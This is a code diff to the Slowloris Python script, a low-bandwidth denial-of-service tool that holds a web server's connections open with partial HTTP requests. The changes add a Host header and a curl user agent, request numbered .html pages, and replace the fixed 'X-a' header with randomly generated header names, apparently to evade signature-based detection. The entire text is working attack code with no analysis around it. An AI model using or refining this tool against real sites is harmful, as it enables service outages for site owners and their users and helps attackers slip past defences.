@@ -5,6 +5,7 @@ import random
 import socket
 import sys
 import time
+import string
 
 parser = argparse.ArgumentParser(
     description="Slowloris, low bandwidth stress test tool for websites"
@@ -96,6 +97,7 @@ if args.https:
 
 list_of_sockets = []
 user_agents = [
+    "curl/7.72.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
@@ -132,12 +134,13 @@ def init_socket(ip):
 
     s.connect((ip, args.port))
 
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    s.send("GET /{}.html HTTP/1.1\r\n".format(random.randint(1, 10)).encode("utf-8"))
+    s.send("Host: {}\r\n".format(ip).encode("utf-8"))
     if args.randuseragent:
         s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
     else:
         s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
-    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+    #s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
     return s
 
 
@@ -163,8 +166,10 @@ def main():
             )
             for s in list(list_of_sockets):
                 try:
+                    N1 = random.randint(1,40)
+                    header_key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N1))
                     s.send(
-                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
+                        "{}: {}\r\n".format(header_key, random.randint(1, 5000)).encode("utf-8")
                     )
                 except socket.error:
                     list_of_sockets.remove(s)
